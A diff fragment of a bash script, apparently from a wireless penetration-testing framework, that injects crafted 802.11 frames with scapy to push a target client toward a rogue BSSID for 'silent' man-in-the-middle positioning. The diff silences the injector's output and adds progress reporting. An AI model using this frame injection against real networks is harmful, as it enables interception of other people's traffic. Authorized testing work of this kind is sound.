@@ -79,7 +79,11 @@ pkt = RadioTap() / Dot11(addr1=target_client, addr2=source_ap, addr3=source_ap) 
 sendp(pkt, iface=iface, count=10, inter=0.1, verbose=0)
 EOF
 
-python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE"
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE"
+else
+    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" > /dev/null 2>&1
+fi
 
 # Reporting
 echo -e "[+] Transition injection complete."
@@ -94,7 +98,6 @@ echo -e "[+] Transition injection complete."
     --evidence "$PYTHON_INJECTOR" \
     --rationale "Abusing 802.11v allows for 'silent' MITM positioning."
 
-exit 0
-"
-
+# 🏁 FINAL SIGNAL
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 exit 0
